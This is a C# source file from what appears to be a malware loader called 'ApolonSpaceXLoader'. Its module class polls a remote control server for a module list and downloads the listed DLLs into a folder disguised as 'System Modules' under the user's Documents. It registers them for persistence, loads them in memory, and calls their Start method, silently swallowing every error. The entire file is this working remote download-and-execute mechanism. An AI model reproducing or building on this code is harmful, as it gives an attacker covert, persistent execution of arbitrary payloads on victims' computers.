namespace ApolonSpaceXLoader
{
    using System;
    using System.Collections.Generic;
    using System.IO;
    using System.Net;
    using System.Reflection;

    class MyModules
    {
        private static List<string> NewModules { get; set; }
        private static int LastInd { get; set; }

        public static void NewSession()
        {
            CheckModuleDirectory();
            foreach (string s in MyRegistry.GetModules().Split(' '))
            {
                try
                {
                    LoadModule(s);
                }
                catch { }
            }
        }

        public static void DownloadModules()
        {
            CheckModuleDirectory();
            foreach (string module in NewModules)
            {
                using (WebClient wc = new WebClient())
                {
                    string name = module.Split('|')[0], link = module.Split('|')[1];
                    wc.DownloadFile(link, Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments), "System Modules", name));
                    MyRegistry.AddModule(LastInd++, name);
                    LoadModule(name);
                }
            }
            NewModules.Clear();
        }

        public static bool CheckNewModules()
        {
            try
            {
                using (WebClient wc = new WebClient())
                {
                    int i = 0;
                    foreach (string s in wc.DownloadString(Program.dom + "/modlist.php").Split('\n'))
                    {
                        i++;
                        if (!MyRegistry.GetModules().Contains(s))
                        {
                            NewModules.Add(s);
                            LastInd = i;
                        }
                    }
                }
                if (NewModules.Count > 0)
                {
                    return true;
                }
                else
                {
                    return false;
                }
            }
            catch
            {
                return false;
            }
        }

        #region Internal
        private static void CheckModuleDirectory()
        {
            string path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments), "System Modules");
            if (!Directory.Exists(path))
            {
                Directory.CreateDirectory(path);
            }
        }

        private static void LoadModule(string ModuleName)
        {
            try
            {
                string path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments), "System Modules", ModuleName);

                var asm = Assembly.Load(File.ReadAllBytes(path));
                dynamic myClass = asm.CreateInstance(ModuleName + ".Class1");
                myClass.Start();
            }
            catch { }
        }
        #endregion
    }
}
